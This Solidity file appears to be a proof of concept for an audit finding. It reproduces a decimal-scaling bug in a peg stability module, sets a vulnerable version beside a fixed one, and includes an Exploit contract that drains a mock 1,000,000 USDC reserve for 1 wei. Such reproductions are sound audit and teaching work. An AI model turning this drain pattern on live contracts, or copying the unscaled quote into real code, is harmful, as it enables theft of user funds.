// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Euler PegStabilityModule — swap quotes use 18-decimal synth units and never
    read underlying.decimals() (Spearbit, Euler EVK, April 2024). A 6-decimal
    underlying pays 1 underlying wei per synth wei. run() does not warp. */

contract Underlying {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    address public owner;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "owner");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Synth {
    string public name = "eUSD";
    string public symbol = "eUSD";
    uint8 public constant decimals = 18;
    Underlying public underlying;
    address public owner;
    address public burner;
    mapping(address => uint256) public balanceOf;

    constructor(Underlying underlying_) {
        underlying = underlying_;
        owner = msg.sender;
    }

    function setBurner(address burner_) external {
        require(msg.sender == owner, "owner");
        burner = burner_;
    }

    function buyFair(uint256 synthOut) external {
        uint256 cost = synthOut / 1e12;
        require(cost != 0, "cost");
        require(underlying.transferFrom(msg.sender, address(this), cost), "pay");
        balanceOf[msg.sender] += synthOut;
    }

    function burn(address from, uint256 amount) external {
        require(msg.sender == burner, "burner");
        balanceOf[from] -= amount;
    }
}

contract PegStabilityModule {
    uint256 public constant BPS_SCALE = 10_000;
    uint256 public priceScale = 1e18;
    uint256 public constant TO_UNDERLYING_FEE = 0;

    Synth public synth;
    Underlying public underlying;

    constructor(Synth synth_, Underlying underlying_) {
        synth = synth_;
        underlying = underlying_;
    }

    function quoteToUnderlyingGivenIn(uint256 amountIn) public view virtual returns (uint256) {
        // @> VULN: 18-decimal priceScale, underlying.decimals() is never applied
        return amountIn * (BPS_SCALE - TO_UNDERLYING_FEE) / BPS_SCALE * priceScale / 1e18;
    }

    function swapToUnderlyingGivenIn(uint256 amountIn, address receiver) external virtual returns (uint256 amountOut) {
        amountOut = quoteToUnderlyingGivenIn(amountIn);
        synth.burn(msg.sender, amountIn);
        require(underlying.transfer(receiver, amountOut), "out");
    }
}

contract PegStabilityModuleFixed is PegStabilityModule {
    constructor(Synth synth_, Underlying underlying_) PegStabilityModule(synth_, underlying_) {}

    function quoteToUnderlyingGivenIn(uint256 amountIn) public view override returns (uint256) {
        uint256 scale = 10 ** (18 - underlying.decimals());
        return amountIn * (BPS_SCALE - TO_UNDERLYING_FEE) / BPS_SCALE / scale;
    }

    function swapToUnderlyingGivenIn(uint256 amountIn, address receiver) external override returns (uint256 amountOut) {
        amountOut = quoteToUnderlyingGivenIn(amountIn);
        synth.burn(msg.sender, amountIn);
        require(underlying.transfer(receiver, amountOut), "out");
    }
}

contract Exploit {
    uint256 public constant RESERVE = 1_000_000e6;
    uint256 public constant SYNTH_IN = 1_000_000e6;
    uint256 public constant FAIR_COST = 1;

    Underlying public underlying;
    Synth public synth;
    PegStabilityModule public psm;
    uint256 public quoted;
    uint256 public fairQuoted;
    uint256 public received;
    uint256 public profit;

    constructor() {
        underlying = new Underlying();
        synth = new Synth(underlying);
        psm = new PegStabilityModule(synth, underlying);
        synth.setBurner(address(psm));
        underlying.mint(address(psm), RESERVE);
    }

    function run() external {
        underlying.mint(address(this), FAIR_COST);
        underlying.approve(address(synth), FAIR_COST);
        synth.buyFair(SYNTH_IN);
        quoted = psm.quoteToUnderlyingGivenIn(SYNTH_IN);
        fairQuoted = SYNTH_IN / 1e12;
        received = psm.swapToUnderlyingGivenIn(SYNTH_IN, address(this));
        profit = underlying.balanceOf(address(this));
        require(quoted == RESERVE, "quote");
        require(fairQuoted == FAIR_COST, "fair");
        require(received == RESERVE, "received");
        require(profit == RESERVE, "profit");
        require(underlying.balanceOf(address(psm)) == 0, "drained");
    }
}
